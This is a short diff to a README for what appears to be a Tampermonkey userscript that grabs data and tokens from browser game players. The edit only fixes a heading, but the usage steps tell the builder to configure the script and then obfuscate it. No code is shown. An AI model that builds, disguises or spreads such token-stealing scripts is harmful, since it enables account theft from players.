@@ -13,7 +13,7 @@ Tampemonkey JS data grabber
 
 Data/token grabber for browser games on js for tampermonkey
 
-#How to use
+# How to use
 1.Download src of PTWline
 2.Configure build in first variables of script
 3.Obfuscate your build
